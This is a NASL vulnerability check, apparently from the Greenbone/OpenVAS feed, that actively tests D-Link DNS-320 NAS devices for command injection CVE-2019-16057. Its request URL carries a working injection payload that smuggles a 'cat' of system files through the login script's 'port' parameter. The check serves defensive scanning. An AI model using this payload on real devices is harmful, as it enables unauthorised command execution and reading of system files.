CPE_PREFIX = "cpe:/o:d-link";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.143216" );
	script_version( "2021-08-30T08:01:20+0000" );
	script_tag( name: "last_modification", value: "2021-08-30 08:01:20 +0000 (Mon, 30 Aug 2021)" );
	script_tag( name: "creation_date", value: "2019-12-03 07:30:17 +0000 (Tue, 03 Dec 2019)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-09-16 19:58:00 +0000 (Mon, 16 Sep 2019)" );
	script_cve_id( "CVE-2019-16057" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "D-Link DNS-320 Remote Command Injection Vulnerability - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dlink_dns_detect.sc", "gb_dlink_dsl_detect.sc", "gb_dlink_dap_detect.sc", "gb_dlink_dir_detect.sc", "gb_dlink_dwr_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_device" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "The D-Link DNS-320 NAS-device is prone to a remote command injection vulnerability." );
	script_tag( name: "insight", value: "The flaw exists in the login module of the device when using a hidden feature
  called SSL Login, for which its required parameter 'port' can be poisoned." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "affected", value: "D-Link DNS-320 versions through 2.05.B10. Other DNS models or D-Link products
  might be affected as well." );
	script_tag( name: "solution", value: "Update to version 2.06B01 or later." );
	script_xref( name: "URL", value: "ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DNS-320/REVA/DNS-320_REVA_RELEASE_NOTES_v2.06B01.pdf" );
	script_xref( name: "URL", value: "https://blog.cystack.net/d-link-dns-320-rce/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=" + port + "%7Cpwd%26cat%20/" + file + "&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=";
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to read the file " + file + "\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

